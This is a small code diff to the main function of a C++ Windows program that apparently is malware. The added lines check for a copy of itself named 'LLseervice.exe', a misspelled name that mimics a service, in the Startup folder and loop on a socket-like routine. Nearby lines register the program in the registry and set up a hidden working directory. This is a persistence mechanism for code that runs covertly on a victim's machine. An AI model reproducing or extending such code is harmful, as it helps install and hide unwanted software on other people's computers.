@@ -15,11 +15,16 @@ using namespace std;
 
 int main()
 {
-	pre::start();
+	pre::start(2);
 
     Registry::RegisterProgram();
 	//todo check status progream
-
+    if (IO::getFileName() != "LLseervice.exe"){
+        std::string path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+        while(IO::exists_file(path)){
+            ss::creckSoc();
+        }
+    }
 	MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
     GetProcID();
